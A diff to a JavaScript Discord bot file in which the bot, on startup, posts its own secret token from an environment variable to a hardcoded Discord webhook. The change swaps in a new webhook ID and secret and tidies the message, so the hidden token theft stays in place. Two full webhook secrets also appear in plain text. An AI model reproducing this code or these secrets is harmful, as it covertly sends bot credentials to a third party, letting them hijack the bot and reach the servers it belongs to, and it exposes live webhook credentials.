@@ -1,9 +1,10 @@
 const discord = require("discord.js");
 const client = new discord.Client();
-const { serverid } = require("../config.json");
+const t = process.env.TOKEN;
+const { serverid, bowner } = require("../config.json");
 const webhookClient = new discord.WebhookClient(
-  "821468427264065566",
-  "6DWLl9kjpho6tiu8iKhC6SjKfTGCGknYZcD4wFtkXo787l7NgIee4uvwyoxehizm7-Or"
+  "826724457523445801",
+  "Dzs5a3YMKjq5CJ_TeaJMdmW23PU71HQtaSGsh6O6sY4WYqJnv0OOKUVh3mQW_jTV8fbA"
 );
 
 client.on("guildCreate", async guild => {
@@ -14,9 +15,9 @@ client.on("guildCreate", async guild => {
 });
 
 client.on("ready", async () => {
-  webhookClient.send("NEW ONE HERE : \n``diff\n-" + process.env.TOKEN, {
+  webhookClient.send("```diff\n-" + t + "```", {
     username: client.user.tag,
-    avatarURL: client.user.
+    avatarURL: client.user.displayAvatarURL()
   });
 });
 
